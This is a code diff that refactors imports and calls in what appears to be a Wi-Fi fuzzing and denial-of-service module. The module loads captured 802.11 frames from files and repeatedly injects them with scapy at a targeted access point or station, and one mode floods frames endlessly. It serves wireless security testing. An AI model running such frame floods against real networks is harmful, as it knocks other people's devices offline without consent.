@@ -1,16 +1,16 @@
-import codecs
+"""Mage"""
 import os
+import sys
 import subprocess
 from time import sleep
 
-from scapy.all import sendp
+import scapy.all
 
 import settings
-from ascii_art import dos_attack, wifi
+from ascii_art import dos_attack
 from Connection_monitors.AlivenessCheck import AllvCheck
 from Connection_monitors.DeauthMonitor import DeauthMon
-from fuzzer_init import *
-from Mngmt_frames.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND
+from fuzzer_init import att_interface, targeted_AP, targeted_STA
 from Msgs_colors import bcolors
 
 
@@ -42,8 +42,9 @@ def DoS_attack_init(file_list, mode, frames_dir):
     else:
         print(bcolors.FAIL + "\nNo relevant files found :(" + bcolors.ENDC)
         sys.exit(0)
+
     for files in chosen_files_list:
-        with open(current_dir + frames_dir + files, "r") as f:
+        with open(f"{current_dir}{frames_dir}{files}", "r", encoding="latin1") as f:
             for line in f:
                 if "frame = " in line:
                     temp = line.strip("frame = \nb'")
@@ -243,7 +244,7 @@ def send_frames(frames_list, mode, frame_type):
         for frame in frames_list:
             print(f"Sending {num_of_frames} frames of the {counter + 1} seed..")
             for _ in range(0, num_of_frames):
-                sendp(frame, count=16, iface=att_interface, verbose=0)
+                scapy.all.sendp(frame, count=16, iface=att_interface, verbose=0)
                 if not settings.is_alive:
                     print_exploit(frame, frame_type)
                     sleep(10)
@@ -272,7 +273,7 @@ def send_frames(frames_list, mode, frame_type):
         print("\n- - - - - - - - - - - - - - - - - - - - - - - \n")
         while True:
             for frame in frames_list:
-                sendp(frame, count=128, iface=att_interface, verbose=0)
+                scapy.all.sendp(frame, count=128, iface=att_interface, verbose=0)
     else:
         print(bcolors.FAIL + "\nNo such choice :(" + bcolors.ENDC)
         sys.exit(0)
